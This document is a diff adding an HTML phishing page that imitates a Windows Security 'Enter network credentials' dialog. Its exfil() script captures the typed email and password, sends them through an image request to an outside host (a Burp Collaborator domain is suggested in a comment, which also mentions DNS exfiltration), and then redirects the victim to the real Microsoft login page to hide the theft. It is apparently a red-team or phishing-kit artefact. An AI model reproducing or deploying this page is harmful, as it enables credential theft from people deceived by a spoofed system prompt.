@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login</title>
+  <meta http-equiv="Cache-Control" content="no-store" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&family=Reddit+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: "Reddit Sans", sans-serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      font-style: normal;
+    }
+    #HeaderTD, #ctl00_Menu1_MN {
+      display: none;
+    }
+    .login-window {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 456px;
+      height: 370px;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      border: 1px solid #b3b3b3;
+      border-radius: 10px;
+      box-sizing: border-box;
+	  box-shadow: 5px 5px 30px #ddd;
+    }
+    .login-header {
+      padding: 16px 24px 0;
+      cursor: default;
+    }
+    .login-content {
+      padding: 0 23px;
+    }
+    .form-group {
+      margin-bottom: 14px;
+    }
+    .form-group.submission {
+      margin-bottom: 0;
+      white-space: nowrap;
+    }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+	  color: #080808;
+	  font-family: 'Open Sans';
+    }
+    .form-group input[type="text"],
+    .form-group input[type="password"] {
+      width: 350px;
+      padding: 9px 9px 7px;
+      border: 1px solid #f2f2f2;
+	  border-bottom: 2px solid #8d8d8d;
+      background: #fff;
+      box-sizing: border-box;
+      border-radius: 5px;
+    }
+    .form-group input[type="text"]::placeholder,
+    .form-group input[type="password"]::placeholder {
+      color: #8d8d8d;
+      opacity: 1;
+    }
+    .form-group input[type="text"]:hover,
+    .form-group input[type="password"]:hover {
+      background: #f9f9f9;
+    }
+    .form-group input[type="text"]:focus,
+    .form-group input[type="password"]:focus {
+	  border-bottom: 2px solid #0069ba;
+      background: #ffffff;
+      color: #000;
+      outline: none;
+    }
+    .form-group input[type="text"]:focus::placeholder,
+    .form-group input[type="password"]:focus::placeholder {
+      color: #999;
+    }
+    .form-group input[type="submit"] {
+      padding: 7px;
+      color: #080808;
+      border-radius: 5px;
+      width: 49.5%;
+      box-sizing: border-box;
+      display: inline-block;
+      white-space: normal;
+	  font-family: 'Open Sans';
+    }
+    .form-group input[type="submit"]:hover {
+      border-color: #6e6e6e;
+    }
+    .no-highlight {
+      user-select: none;
+      -moz-user-select: none;
+      -webkit-text-select: none;
+      -webkit-user-select: none;
+    }
+	#okButton {
+	  background: #0069ba;
+	  border: 1px solid #0069ba;
+	  color: #fff;
+	}
+	#okButton:hover {
+      opacity: 0.9;
+	}
+	#cancelButton {
+	  background: #fff;
+	  border: 1px solid #f2f2f2;
+	}
+	#cancelButton:hover {
+	  background: #f9f9f9;
+	}
+  </style>
+</head>
+<body>
+  <div class="login-window no-highlight" id="loginWindow">
+    <div class="login-header" id="loginHeader">
+	  <img alt="" src="data:image/png;base64,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" style="height: 26px; width: 26px; vertical-align: middle; margin-right: 20px;"/>
+      <span style="font-size: 13px;">Windows Security</span>
+      <p style="font-size: 22px; margin-top: 25px; margin-bottom: 19px; font-weight: 700; letter-spacing: 0.5px;">Enter network credentials</p>
+      <p style="font-size: 14px; margin: 10px 0 27px; font-family: 'Open Sans';">Authorization required by http://website.com</p>
+    </div>
+    <div class="login-content">
+      <form id="loginForm" onsubmit="exfil(); return false;" autocomplete="off">
+        <fieldset style="border: none; margin: 0; padding: 0;">
+          <div class="form-group">
+			<label id="usernameLabel">Email address</label>
+            <input type="text" id="UserNameText" name="username" placeholder="Email address" required />
+          </div>
+          <div class="form-group" style="margin-bottom: 32px;">
+            <label id="passwordLabel">Password</label>
+			<input type="password" id="PasswordText" name="password" placeholder="Password" required />
+          </div>
+          <div class="form-group submission">
+            <input id="okButton" type="submit" value="OK" />
+            <input id="cancelButton" type="submit" value="Cancel" />
+          </div>
+        </fieldset>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function exfil() {
+      const u = encodeURIComponent(document.getElementById("UserNameText").value);
+      const p = encodeURIComponent(document.getElementById("PasswordText").value);
+      const protocol = window.location.protocol;
+      
+      const host = // host with valid SSL cert (e.g. burp collaborator 10zd6vqmp4s3uoveqramsqf01r7ivajz.oastify.com) window.location.hostname;
+      // const port = protocol === "https:" ? "9999" : "9998";
+      const i = new Image();
+      i.src = `${protocol}//${host}/log?u=${u}&p=${p}`;
+    
+      // Optionally hold the image in DOM - Potential for DNS exfil here
+      document.body.appendChild(i);
+    
+      // Redirect
+      setTimeout(() => {
+        window.location.href = "https://login.microsoftonline.com";
+      }, 1000);
+    }
+  </script>
+
+  <script>
+    const loginWindow = document.getElementById('loginWindow');
+    const loginHeader = document.getElementById('loginHeader');
+    let offsetX, offsetY;
+
+    loginHeader.addEventListener('mousedown', startDrag);
+
+    function startDrag(event) {
+      event.preventDefault();
+      offsetX = event.clientX - loginWindow.getBoundingClientRect().left;
+      offsetY = event.clientY - loginWindow.getBoundingClientRect().top;
+      document.addEventListener('mousemove', drag);
+      document.addEventListener('mouseup', stopDrag);
+    }
+
+    function drag(event) {
+      loginWindow.style.left = event.clientX - offsetX + 'px';
+      loginWindow.style.top = event.clientY - offsetY + 'px';
+    }
+
+    function stopDrag() {
+      document.removeEventListener('mousemove', drag);
+      document.removeEventListener('mouseup', stopDrag);
+    }
+  </script>
+</body>
+</html>
